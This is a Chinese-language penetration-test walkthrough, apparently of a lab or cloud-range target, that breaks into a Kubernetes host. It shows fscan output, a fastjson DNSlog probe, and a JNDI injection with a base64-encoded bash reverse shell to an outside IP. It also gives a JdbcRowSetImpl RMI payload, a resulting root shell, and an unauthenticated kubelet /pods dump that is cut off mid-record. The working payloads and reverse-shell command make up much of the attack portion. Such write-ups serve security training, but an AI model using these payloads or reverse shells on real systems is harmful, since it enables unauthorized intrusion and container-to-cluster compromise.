<html>
<body>
<!--StartFragment--><!-- obsidian --><h1 data-heading="外网">外网</h1>
<pre><code class="language-zsh">┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# fscan -h 8.160.113.240

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &#x3C;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
8.160.113.240:2379 open
8.160.113.240:22 open
8.160.113.240:10250 open
8.160.113.240:8080 open
[*] alive ports len is: 4
start vulscan
[*] WebTitle https://8.160.113.240:10250 code:200 len:104    title:None
[*] WebTitle http://8.160.113.240:8080 code:302 len:0      title:None 跳转url: http://8.160.113.240:8080/login;jsessionid=A912E07FFA91B0749449123458601497
[*] WebTitle http://8.160.113.240:8080/login;jsessionid=A912E07FFA91B0749449123458601497 code:400 len:277    title:None
</code></pre>
<p>10250 是 <strong>kubelet 的安全 API 端口</strong>（HTTPS）。kubelet 是每个节点上负责管理 Pod 生命周期的代理，API Server 也是通过这个端口来向 kubelet 下达指令（如创建、删除 Pod）的。</p>
<p><strong>2379端口</strong>是<strong>etcd</strong>服务的默认客户端连接端口。<strong>etcd</strong>是一个高可用的分布式键值存储系统，常用于服务发现和配置共享。</p>
<p>10250访问会返回403，这个是因为k8s限制外网ip访问</p>
<ul>
<li><code>kubectl logs</code>（查看容器日志）</li>
<li><code>kubectl exec</code>（在容器内执行命令）</li>
<li><code>kubectl attach</code>（连接到容器）</li>
<li><code>kubectl port-forward</code>（转发端口）</li>
</ul>
<p>外网的入口点在8080端口，fastjson反序列化，只能说这个漏洞点很难找</p>
<pre><code>POST /create HTTP/1.1
Host: 8.160.113.240:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://8.160.113.240:8080/create
Content-Type: application/json
Content-Length: 76
Origin: http://8.160.113.240:8080
Connection: keep-alive
Cookie: JSESSIONID=2B3A8D898A58536A30E2D037399B9094
Priority: u=0

{
  "content":{"@type":"java.net.Inet4Address","val":"mndsvq.dnslog.cn"}
}
</code></pre>

<img width="1988" height="946" alt="Image" src="https://github.com/user-attachments/assets/9e8d2561-adff-44ab-8937-5c24cc1466c4" />

能收到响应，接下来打JNDI注入，其实能发现fastjson就好打了，但是发现很难</p>
<p>vps开rmi和ladp服务器，同时开监听</p>
<pre><code class="language-zsh">root@VM-8-5-ubuntu:~# java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yMTEuMTU5LjE3NS4yMS8yMzMyIDA+JjE=}|{base64,-d}|{bash,-i}" -A "211.159.175.21"
[ADDRESS] >> 211.159.175.21
[COMMAND] >> bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yMTEuMTU5LjE3NS4yMS8yMzMyIDA+JjE=}|{base64,-d}|{bash,-i}
----------------------------JNDI Links----------------------------
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://211.159.175.21:1099/jszedn
ldap://211.159.175.21:1389/jszedn
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://211.159.175.21:1099/ff0exj
ldap://211.159.175.21:1389/ff0exj
Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://211.159.175.21:1099/hiyu1y

----------------------------Server Log----------------------------
2026-09-24 18:03:29 [JETTYSERVER]>> Listening on 0.0.0.0:8180
2026-09-24 18:03:29 [RMISERVER]  >> Listening on 0.0.0.0:1099
2026-09-24 18:03:29 [LDAPSERVER] >> Listening on 0.0.0.0:1389

root@VM-8-5-ubuntu:~# nc -lvnp 2332
Listening on 0.0.0.0 2332
</code></pre>
<p>发包拿shell即可</p>
<pre><code>POST /create HTTP/1.1
Host: 8.160.113.240:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://8.160.113.240:8080/create
Content-Type: application/json
Content-Length: 263
Origin: http://8.160.113.240:8080
Connection: keep-alive
Cookie: JSESSIONID=2B3A8D898A58536A30E2D037399B9094
Priority: u=0

{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://211.159.175.21:1099/ff0exj",
        "autoCommit":true
    }
}
</code></pre>
<pre><code class="language-zsh">root@52a205b59ba8:/app# id
id
uid=0(root) gid=0(root) groups=0(root)
root@52a205b59ba8:/app#
</code></pre>
<p>主机名一看大概率就是个docker，同时根据fscan对外网主机扫描暴露的端口，很容易判断这是个k8s集群</p>
<p>通过docker对k8s的api端口访问不会被拦截，因为docker访问外网主机只需要使用内网ip即可</p>
<pre><code class="language-bash">root@52a205b59ba8:/app# ip a
1: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
</code></pre>
<p>一般宿主机的docker网卡是同网段的.1也就是172.17.0.1</p>
<p>查看所有pod</p>
<pre><code class="language-bash">root@52a205b59ba8:/app# curl https://172.17.0.1:10250/pods -k
</code></pre>
<pre><code class="language-json">{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},
  "items": [
    {
      "metadata": {
        "name": "kube-controller-manager-web",
        "namespace": "kube-system",
        "selfLink": "/api/v1/namespaces/kube-system/pods/kube-controller-manager-web",
        "uid": "f50eab22113ed55f640ed65722a1b225",
        "creationTimestamp": null,
        "labels": {
          "component": "kube-controller-manager",
          "tier": "control-plane"
        },
        "annotations": {
          "kubernetes.io/config.hash": "f50eab22113ed55f640ed65722a1b225",
          "kubernetes.io/config.seen": "2026-09-24T17:54:59.697303844Z",
          "kubernetes.io/config.source": "file"
        }
      },
      "spec": {
        "volumes": [
          {
            "name": "ca-certs",
            "hostPath": {
              "path": "/etc/ssl/certs",
              "type": "DirectoryOrCreate"
            }
          },
          {
            "name": "etc-ca-certificates",
            "hostPath": {
              "path": "/etc/ca-certificates",
              "type": "DirectoryOrCreate"
            }
          },
          {
            "name": "flexvolume-dir",
            "hostPath": {
              "path": "/usr/libexec/kubernetes/kubelet-plugins/volume/exec",
              "type": "DirectoryOrCreate"
            }
          },
          {
            "name": "k8s-certs",
            "hostPath": {
              "path": "/etc/kubernetes/pki",
              "type": "DirectoryOrCreate"
            }
          },
          {
            "name": "kubeconfig",
            "hostPath": {
              "path": "/etc/kubernetes/controller-manager.conf",
              "type": "FileOrCreate"
            }
          },
          {
            "name": "usr-local-share-ca-certificates",
            "hostPath": {
              "path": "/usr/local/share/ca-certificates",
              "type": "DirectoryOrCreate"
            }
          },
          {
            "name": "usr-share-ca-certificates",
            "hostPath": {
              "path": "/usr/share/ca-certificates",
              "type": "DirectoryOrCreate"
            }
          }
        ],
        "containers": [
          {
            "name": "kube-controller-manager",
            "image": "registry.aliyuncs.com/google_containers/kube-controller-manager:v1.16.5",
            "command": [
              "kube-controller-manager",
              "--allocate-node-cidrs=true",
              "--authentication-kubeconfig=/etc/kubernetes/controller-manager.conf",
              "--authorization-kubeconfig=/etc/kubernetes/controller-manager.conf",
              "--bind-address=127.0.0.1",
              "--client-ca-file=/etc/kubernetes/pki/ca.crt",
              "--cluster-cidr=10.244.0.0/16",
              "--cluster-signing-cert-file=/etc/kubernetes/pki/ca.crt",
              "--cluster-signing-key-file=/etc/kubernetes/pki/ca.key",
              "--controllers=*,bootstrapsigner,tokencleaner",
              "--kubeconfig=/etc/kubernetes/controller-manager.conf",
              "--leader-elect=true",
              "--node-cidr-mask-size=24",
              "--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt",
              "--root-ca-file=/etc/kubernetes/pki/ca.crt",
              "--service-account-private-key-file=/etc/kubernetes/pki/sa.key",
              "--service-cluster-ip-range=10.96.0.0/12",
              "--use-service-account-credentials=true"
            ],
            "resources": {
              "requests": {
                "cpu": "200m"
              }
            },
            "volumeMounts": [
              {
                "name": "ca-certs",
                "readOnly": true,
                "mountPath": "/etc/ssl/certs"
              },
              {
                "name": "etc-ca-certificates",
                "readOnly": true,
                "mountPath": "/etc/ca-certificates"
              },
              {
                "name": "flexvolume-dir",
                "mountPath": "/usr/libexec/kubernetes/kubelet-plugins/volume/exec"
              },
              {
                "name": "k8s-certs",
                "readOnly": true,
                "mountPath": "/etc/kubernetes/pki"
              },
              {
                "name": "kubeconfig",
                "readOnly": true,
                "mountPath": "/etc/kubernetes/controller-manager.conf"
              },
              {
                "name": "usr-local-share-ca-certificates",
                "readOnly": true,
                "mountPath": "/usr/local/share/ca-certificates"
              },
              {
                "name": "usr-share-ca-certificates",
                "readOnly": true,
                "mountPath": "/usr/share/ca-certificates"
              }
            ],
            "livenessProbe": {
              "httpGet": {
                "path": "/healthz",
                "port": 10252,
                "host": "127.0.0.1",
                "scheme": "HTTP"
              },
              "initialDelaySeconds": 15,
              "timeoutSeconds": 15,
              "periodSeconds": 10,
              "successThreshold": 1,
              "failureThreshold": 8
            },
            "terminationMessagePath": "/dev/termination-log",
            "terminationMessagePolicy": "File",
            "imagePullPolicy": "IfNotPresent"
          }
        ],
        "restartPolicy": "Always",
        "terminationGracePeriodSeconds": 30,
        "dnsPolicy": "ClusterFirst",
        "nodeName": "web",
        "hostNetwork": true,
        "securityContext": {},
        "schedulerName": "default-scheduler",
        "tolerations": [
          {
            "operator": "Exists",
            "effect": "NoExecute"
          }
        ],
        "priorityClassName": "system-cluster-critical",
        "enableServiceLinks": true
      },
      "status": {
        "phase": "Running",
        "conditions": [
          {
            "type": "Initialized",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-09-24T09:55:20Z"
          },
          {
            "type": "Ready",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-09-24T09:55:23Z"
          },
          {
            "type": "ContainersReady",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-09-24T09:55:23Z"
          },
          {
            "type": "PodScheduled",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-09-24T09:55:20Z"
          }
        ],
        "hostIP": "192.168.1.56",
        "podIP": "192.168.1.56",
        "podIPs": [
          {
            "ip": "192.168.1.56"
          }
        ],
        "startTime": "2026-09-24T09:55:20Z",
        "containerStatuses": [
          {
            "name": "kube-controller-manager",
            "state": {
              "running": {
                "startedAt": "2026-09-24T09:55:22Z"
              }
            },
            "lastState": {
              "terminated": {
                "exitCode": 255,
                "reason": "Error",
                "startedAt": "2026-04-17T17:26:41Z",
                "finishedAt": "2026-09-24T17:54:56Z",
                "containerID": "docker://4eee9f10e7ece666912c13a858bdeb31e58820e645c003a4734c8ce4766f2beb"
              }
            },
            "ready": true,
            "restartCount": 9,
            "image": "registry.aliyuncs.com/google_containers/kube-controller-manager:v1.16.5",
            "imageID": "docker-pullable://registry.aliyuncs.com/google_containers/kube-controller-manager@sha256:d807554df171ba4f3b56aa2a63c2ef5b56af095fd7aebdeafedbbfcda5275d10",
            "containerID": "docker://97e082c37fa8e3d78dace0e4d64c99dcea8e9c07a94fddf85c5a3bde97242a92",
            "started": true
          }
        ],
        "qosClass": "Burstable"
      }
    },
    {
      "metadata": {
        "name": "kube-scheduler-web",
        "namespace": "kube-system",
        "selfLink": "/api/v1/namespaces/kube-system/pods/kube-scheduler-web",
        "uid": "2a528eea0130758e2a9e516b17b74d35",
        "creationTimestamp": null,
        "labels": {
          "component": "kube-scheduler",
          "tier": "control-plane"
        },
        "annotations": {
          "kubernetes.io/config.hash": "2a528eea0130758e2a9e516b17b74d35",
          "kubernetes.io/config.seen": "2026-09-24T17:54:59.69730648Z",
          "kubernetes.io/config.source": "file"
        }
      },
      "spec": {
        "volumes": [
          {
            "name": "kubeconfig",
            "hostPath": {
              "path": "/etc/kubernetes/scheduler.conf",
              "type": "FileOrCreate"
            }
          }
        ],
        "containers": [
          {
            "name": "kube-scheduler",
            "image": "registry.aliyuncs.com/google_containers/kube-scheduler:v1.16.5",
            "command": [
              "kube-scheduler",
              "--authentication-kubeconfig=/etc/kubernetes/scheduler.conf",
              "--authorization-kubeconfig=/etc/kubernetes/scheduler.conf",
              "--bind-address=127.0.0.1",
              "--kubeconfig=/etc/kubernetes/scheduler.conf",
              "--leader-elect=true"
            ],
            "resources": {
              "requests": {
                "cpu": "100m"
              }
            },
            "volumeMounts": [
              {
                "name": "kubeconfig",
                "readOnly": true,
                "mountPath": "/etc/kubernetes/scheduler.conf"
              }
            ],
            "livenessProbe": {
              "httpGet": {
                "path": "/healthz",
                "port": 10251,
                "host": "127.0.0.1",
                "scheme": "HTTP"
              },
              "initialDelaySeconds": 15,
              "timeoutSeconds": 15,
              "periodSeconds": 10,
              "successThreshold": 1,
              "failureThreshold": 8
            },
            "terminationMessagePath": "/dev/termination-log",
            "terminationMessagePolicy": "File",
            "imagePullPolicy": "IfNotPresent"
          }
        ],
        "restartPolicy": "Always",
        "terminationGracePeriodSeconds": 30,
        "dnsPolicy": "ClusterFirst",
        "nodeName": "web",
        "hostNetwork": true,
        "securityContext": {},
        "schedulerName": "default-scheduler",
        "tolerations": [
          {
            "operator": "Exists",
            "effect": "NoExecute"
          }
        ],
        "priorityClassName": "system-cluster-critical",
        "enableServiceLinks": true
      },
      "status": {
        "phase": "Running",
        "conditions": [
          {
            "type": "Initialized",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-09-24T09:55:20Z"
          },
          {
            "type": "Ready",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-09-24T09:55:23Z"
          },
          {
            "type": "ContainersReady",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-09-24T09:55:23Z"
          },
          {
            "type": "PodScheduled",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-09-24T09:55:20Z"
          }
        ],
        "hostIP": "192.168.1.56",
        "podIP": "192.168.1.56",
        "podIPs": [
          {
            "ip": "192.168.1.56"
          }
        ],
        "startTime": "2026-09-24T09:55:20Z",
        "containerStatuses": [
          {
            "name": "kube-scheduler",
            "state": {
              "running": {
                "startedAt": "2026-09-24T09:55:22Z"
              }
            },
            "lastState": {
              "terminated": {
                "exitCode": 255,
                "reason": "Error",
                "startedAt": "2026-04-17T17:26:41Z",
                "finishedAt": "2026-09-24T17:54:56Z",
                "containerID": "docker://69cd8f48ef273a80a2c5b5af45692978bd34b1bf4e701c5babf1ce8f21669ab2"
              }
            },
            "ready": true,
            "restartCount": 10,
            "image": "registry.aliyuncs.com/google_containers/kube-scheduler:v1.16.5",
            "imageID": "docker-pullable://registry.aliyuncs.com/google_containers/kube-scheduler@sha256:8f20c90afce972ae51acaf425b7bdb6445f54168b52ea311b2b89adf5db1acac",
            "containerID": "docker://0ff82495750451a7561674f1f8bd1c7c97cc690c5bafe017eb09ebd29f34162b",
            "started": true
          }
        ],
        "qosClass": "Burstable"
      }
    },
    {
      "metadata": {
        "name": "kube-flannel-ds-7tjnc",
        "generateName": "kube-flannel-ds-",
        "namespace": "kube-flannel",
        "selfLink": "/api/v1/namespaces/kube-flannel/pods/kube-flannel-ds-7tjnc",
        "uid": "2ee99dbf-5741-48d2-83b3-666f1789f702",
        "resourceVersion": "6975",
        "creationTimestamp": "2026-04-16T07:57:47Z",
        "labels": {
          "app": "flannel",
          "controller-revision-hash": "5c766884b",
          "pod-template-generation": "1"
        },
        "annotations": {
          "kubernetes.io/config.seen": "2026-09-24T09:55:28.64842285Z",
          "kubernetes.io/config.source": "api"
        },
        "ownerReferences": [
          {
            "apiVersion": "apps/v1",
            "kind": "DaemonSet",
            "name": "kube-flannel-ds",
            "uid": "f0fea1f7-3b34-4f8f-bbd2-e95836da73e9",
            "controller": true,
            "blockOwnerDeletion": true
          }
        ]
      },
      "spec": {
        "volumes": [
          {
            "name": "flannel-cfg",
            "configMap": {
              "name": "kube-flannel-cfg",
              "defaultMode": 420
            }
          },
          {
            "name": "cni",
            "hostPath": {
              "path": "/etc/cni/net.d",
              "type": ""
            }
          },
          {
            "name": "flannel-token-wxz9b",
            "secret": {
              "secretName": "flannel-token-wxz9b",
              "defaultMode": 420
            }
          }
        ],
        "containers": [
          {
            "name": "kube-flannel",
            "image": "quay.io/coreos/flannel:v0.11.0-amd64",
            "command": [
              "/opt/bin/flanneld"
            ],
            "args": [
              "--ip-masq",
              "--kube-subnet-mgr"
            ],
            "env": [
              {
                "name": "POD_NAME",
                "valueFrom": {
                  "fieldRef": {
                    "apiVersion": "v1",
                    "fieldPath": "metadata.name"
                  }
                }
              },
              {
                "name": "POD_NAMESPACE",
                "valueFrom": {
                  "fieldRef": {
                    "apiVersion": "v1",
                    "fieldPath": "metadata.namespace"
                  }
                }
              }
            ],
            "resources": {},
            "volumeMounts": [
              {
                "name": "flannel-cfg",
                "mountPath": "/etc/kube-flannel"
              },
              {
                "name": "cni",
                "mountPath": "/etc/cni/net.d"
              },
              {
                "name": "flannel-token-wxz9b",
                "readOnly": true,
                "mountPath": "/var/run/secrets/kubernetes.io/serviceaccount"
              }
            ],
            "terminationMessagePath": "/dev/termination-log",
            "terminationMessagePolicy": "File",
            "imagePullPolicy": "IfNotPresent",
            "securityContext": {
              "privileged": true
            }
          }
        ],
        "restartPolicy": "Always",
        "terminationGracePeriodSeconds": 30,
        "dnsPolicy": "ClusterFirst",
        "serviceAccountName": "flannel",
        "serviceAccount": "flannel",
        "nodeName": "web",
        "hostNetwork": true,
        "securityContext": {},
        "affinity": {
          "nodeAffinity": {
            "requiredDuringSchedulingIgnoredDuringExecution": {
              "nodeSelectorTerms": [
                {
                  "matchFields": [
                    {
                      "key": "metadata.name",
                      "operator": "In",
                      "values": [
                        "web"
                      ]
                    }
                  ]
                }
              ]
            }
          }
        },
        "schedulerName": "default-scheduler",
        "tolerations": [
          {
            "operator": "Exists",
            "effect": "NoSchedule"
          },
          {
            "key": "node.kubernetes.io/not-ready",
            "operator": "Exists",
            "effect": "NoExecute"
          },
          {
            "key": "node.kubernetes.io/unreachable",
            "operator": "Exists",
            "effect": "NoExecute"
          },
          {
            "key": "node.kubernetes.io/disk-pressure",
            "operator": "Exists",
            "effect": "NoSchedule"
          },
          {
            "key": "node.kubernetes.io/memory-pressure",
            "operator": "Exists",
            "effect": "NoSchedule"
          },
          {
            "key": "node.kubernetes.io/pid-pressure",
            "operator": "Exists",
            "effect": "NoSchedule"
          },
          {
            "key": "node.kubernetes.io/unschedulable",
            "operator": "Exists",
            "effect": "NoSchedule"
          },
          {
            "key": "node.kubernetes.io/network-unavailable",
            "operator": "Exists",
            "effect": "NoSchedule"
          }
        ],
        "priority": 0,
        "enableServiceLinks": true
      },
      "status": {
        "phase": "Running",
        "conditions": [
          {
            "type": "Initialized",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-04-16T07:57:47Z"
          },
          {
            "type": "Ready",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-09-24T09:56:15Z"
          },
          {
            "type": "ContainersReady",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-09-24T09:56:15Z"
          },
          {
            "type": "PodScheduled",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-04-16T07:57:47Z"
          }
        ],
        "hostIP": "192.168.1.56",
        "podIP": "192.168.1.56",
        "podIPs": [
          {
            "ip": "192.168.1.56"
          }
        ],
        "startTime": "2026-04-16T07:57:47Z",
        "containerStatuses": [
          {
            "name": "kube-flannel",
            "state": {
              "running": {
                "startedAt": "2026-09-24T09:56:14Z"
              }
            },
            "lastState": {
              "terminated": {
                "exitCode": 1,
                "reason": "Error",
                "startedAt": "2026-09-24T09:55:31Z",
                "finishedAt": "2026-09-24T09:56:01Z",
                "containerID": "docker://a7a08e40b7d32fa58a2633448f75ca5783c21d5c0aef175022f5db3ce56ce167"
              }
            },
            "ready": true,
            "restartCount": 10,
            "image": "quay.io/coreos/flannel:v0.11.0-amd64",
            "imageID": "docker-pullable://quay.io/coreos/flannel@sha256:7806805c93b20a168d0bbbd25c6a213f00ac58a511c47e8fa6409543528a204e",
            "containerID": "docker://9a327625c390db3f1780034b2ff728593bd042e58d007d3434f7ee2137cd3b6e",
            "started": true
          }
        ],
        "qosClass": "BestEffort"
      }
    },
    {
      "metadata": {
        "name": "kube-proxy-j874v",
        "generateName": "kube-proxy-",
        "namespace": "kube-system",
        "selfLink": "/api/v1/namespaces/kube-system/pods/kube-proxy-j874v",
        "uid": "84ee99bb-d025-4b62-a2dd-44012d40d1e3",
        "resourceVersion": "7009",
        "creationTimestamp": "2026-04-16T08:19:40Z",
        "labels": {
          "controller-revision-hash": "844c78dc9",
          "k8s-app": "kube-proxy",
          "pod-template-generation": "1"
        },
        "annotations": {
          "kubernetes.io/config.seen": "2026-09-24T09:55:28.648441144Z",
          "kubernetes.io/config.source": "api"
        },
        "ownerReferences": [
          {
            "apiVersion": "apps/v1",
            "kind": "DaemonSet",
            "name": "kube-proxy",
            "uid": "ce02234e-3c04-4cd6-bd21-c2c04ec22234",
            "controller": true,
            "blockOwnerDeletion": true
          }
        ]
      },
      "spec": {
        "volumes": [
          {
            "name": "kube-proxy",
            "configMap": {
              "name": "kube-proxy",
              "defaultMode": 420
            }
          },
          {
            "name": "xtables-lock",
            "hostPath": {
              "path": "/run/xtables.lock",
              "type": "FileOrCreate"
            }
          },
          {
            "name": "lib-modules",
            "hostPath": {
              "path": "/lib/modules",
              "type": ""
            }
          },
          {
            "name": "kube-proxy-token-kbw4r",
            "secret": {
              "secretName": "kube-proxy-token-kbw4r",
              "defaultMode": 420
            }
          }
        ],
        "containers": [
          {
            "name": "kube-proxy",
            "image": "registry.aliyuncs.com/google_containers/kube-proxy:v1.16.5",
            "command": [
              "/usr/local/bin/kube-proxy",
              "--config=/var/lib/kube-proxy/config.conf",
              "--hostname-override=$(NODE_NAME)"
            ],
            "env": [
              {
                "name": "NODE_NAME",
                "valueFrom": {
                  "fieldRef": {
                    "apiVersion": "v1",
                    "fieldPath": "spec.nodeName"
                  }
                }
              }
            ],
            "resources": {},
            "volumeMounts": [
              {
                "name": "kube-proxy",
                "mountPath": "/var/lib/kube-proxy"
              },
              {
                "name": "xtables-lock",
                "mountPath": "/run/xtables.lock"
              },
              {
                "name": "lib-modules",
                "readOnly": true,
                "mountPath": "/lib/modules"
              },
              {
                "name": "kube-proxy-token-kbw4r",
                "readOnly": true,
                "mountPath": "/var/run/secrets/kubernetes.io/serviceaccount"
              }
            ],
            "terminationMessagePath": "/dev/termination-log",
            "terminationMessagePolicy": "File",
            "imagePullPolicy": "IfNotPresent",
            "securityContext": {
              "privileged": true
            }
          }
        ],
        "restartPolicy": "Always",
        "terminationGracePeriodSeconds": 30,
        "dnsPolicy": "ClusterFirst",
        "nodeSelector": {
          "beta.kubernetes.io/os": "linux"
        },
        "serviceAccountName": "kube-proxy",
        "serviceAccount": "kube-proxy",
        "nodeName": "web",
        "hostNetwork": true,
        "securityContext": {},
        "affinity": {
          "nodeAffinity": {
            "requiredDuringSchedulingIgnoredDuringExecution": {
              "nodeSelectorTerms": [
                {
                  "matchFields": [
                    {
                      "key": "metadata.name",
                      "operator": "In",
                      "values": [
                        "web"
                      ]
                    }
                  ]
                }
              ]
            }
          }
        },
        "schedulerName": "default-scheduler",
        "tolerations": [
          {
            "key": "CriticalAddonsOnly",
            "operator": "Exists"
          },
          {
            "operator": "Exists"
          },
          {
            "key": "node.kubernetes.io/not-ready",
            "operator": "Exists",
            "effect": "NoExecute"
          },
          {
            "key": "node.kubernetes.io/unreachable",
            "operator": "Exists",
            "effect": "NoExecute"
          },
          {
            "key": "node.kubernetes.io/disk-pressure",
            "operator": "Exists",
            "effect": "NoSchedule"
          },
          {
            "key": "node.kubernetes.io/memory-pressure",
            "operator": "Exists",
            "effect": "NoSchedule"
          },
          {
            "key": "node.kubernetes.io/pid-pressure",
            "operator": "Exists",
            "effect": "NoSchedule"
          },
          {
            "key": "node.kubernetes.io/unschedulable",
            "operator": "Exists",
            "effect": "NoSchedule"
          },
          {
            "key": "node.kubernetes.io/network-unavailable",
            "operator": "Exists",
            "effect": "NoSchedule"
          }
        ],
        "priorityClassName": "system-node-critical",
        "priority": 2000001000,
        "enableServiceLinks": true
      },
      "status": {
        "phase": "Running",
        "conditions": [
          {
            "type": "Initialized",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-04-16T08:19:40Z"
          },
          {
            "type": "Ready",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-09-24T09:55:31Z"
          },
          {
            "type": "ContainersReady",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-09-24T09:55:31Z"
          },
          {
            "type": "PodScheduled",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2026-04-16T08:19:40Z"
          }
        ],
        "hostIP": "192.168.1.56",
        "podIP": "192.168.1.56",
        "podIPs": [
          {
            "ip": "192.168.1.56"
          }
        ],
        "startTime": "2026-04-16T08:19:40Z",
        "containerStatuses": [
          {
            "name": "kube-proxy",
            "state": {
              "running": {
                "startedAt": "2026-09-24T09:55:31Z"
              }
            },
            "lastState": {
              "terminated": {
                "exitCode": 255,
                "reason": "Error",
                "startedAt": "2026-04-17T17:26:51Z",
                "finishedAt": "2026-09-24T17:54:56Z",
                "containerID": "docker://c326f93b41399ca58a0f908c4f73c348dcb15c8510d7f859318ad6c680d80ad0"
              }
            },
            "ready": true,
            "restartCount": 5,
            "image": "registry.aliyuncs.com/google_containers/kube-proxy:v1.16.5",
            "imageID": "docker-pullable://registry.aliyuncs.com/google_containers/kube-proxy@sha256:166939d1b8d0988d675a027f459e40fbded092887905cc1b62b7e4cb67d493c5",
            "containerID": "docker://82496e8a37507865ad7edd9fe8fc4ebe69dc304480f8fb5dc32124f0bdd28de8",
            "started": true
          }
        ],
        "qosClass": "BestEffort"
      }
    },
    {
      "metadata": {
        "name": "etcd-web",
        "namespace": "kube-system",
        "selfLink": "/api/v1/namespaces/kube-system/pods/etcd-web",
        "uid": "5a5c733754817033fbac18a841a4281f",
        "creationTimestamp": null,
        "labels": {
          "component": "etcd",
          "tier": "control-plane"
        },
        "annotations": {
          "kubernetes.io/config.hash": "5a5c733754817033fbac18a841a4281f",
          "kubernetes.io/config.seen": "2026-09-24T17:54:59.697291589Z",
          "kubernetes.io/config.source": "file"
        }
      },
      "spec": {
        "volumes": [
          {
            "name": "etcd-certs",
            "hostPath": {
              "path": "/etc/kubernetes/pki/etcd",
              "type": "DirectoryOrCreate"
            }
          },
          {
            "name": "etcd-data",
            "hostPath": {
              "path": "/var/lib/etcd",
              "type": "DirectoryOrCreate"
            }
          }
        ],
        "containers": [
          {
            "name": "etcd",
            "image": "registry.aliyuncs.com/google_containers/etcd:3.3.15-0",
            "command": [
              "etcd",
              "--advertise-client-urls=https://192.168.1.56:2379",
              "--cert-file=/etc/kubernetes/pki/etcd/server.crt",
              "--client-cert-auth=true",
              "--data-dir=/var/lib/etcd",
              "--initial-advertise-peer-urls=https://192.168.1.56:2380",
              "--initial-cluster=web=https://192.168.1.56:2380",
              "--key-file=/etc/kubernetes/pki/etcd/server.key",
              "--listen-client-urls=https://127.0.0.1:2379,https://192.168.1.56:2379",
              "--listen-metrics-urls=http://127.0.0.1:2381",
              "--listen-peer-urls=https://192.168.1.56:2380",
              "--name=web",
              "--peer-cert-file=/etc/kubernetes/pki/etcd/peer.crt",
              "--peer-client-cert-auth=true",
              "--peer-key-file=/etc/kubernetes/pki/etcd/peer.key",
              "--peer-trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt",
              "--snapshot-count=10000",
              "--trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt"
            ],
            "resources": {},
            "volumeMounts": [
              {
                "name": "etcd-data",
                "mountPath": "/var/lib/etcd"
              },
              {
                "name": "etcd-certs",
                "mountPath": "/etc/kubernetes/pki/etcd"
              }
            ],
            "livenessProbe": {
              "httpGet": {
                "path": "/health",
                "port": 2381,
                "host": "127.0.0.1",
                "scheme": "HTTP"
              },
              "initialDelaySeconds": 15,
              "timeoutSeconds": 15,
              "periodSeconds": 10,
              "successThreshold": 1,
              "failureThreshold": 8
            },
            "terminationMessagePath": "/dev/termination-log",
            "terminationMessagePolicy": "File",
            "imagePullPolicy": "IfNotPresent"
          }
        ],
        "restartPolicy": "Always",
        "terminationGracePeriodSeconds": 30,
        "dnsPolicy": "ClusterFirst",
        "nodeName": "web",
        "hostNetwork": true,
        "securityContext": {},
        "schedulerName": "default-scheduler",
        "tolerations": [
          {
            "operator": "Exists",
            "effect": "NoExecute"
          }
        ],
        "priorityClassName": "system-cluster-critical",
        "enableServiceLinks": true
      },
      "status": {
        "phase": "Running",
        "conditions": [
          {
            "type": "Initialized",
            "status": "True",
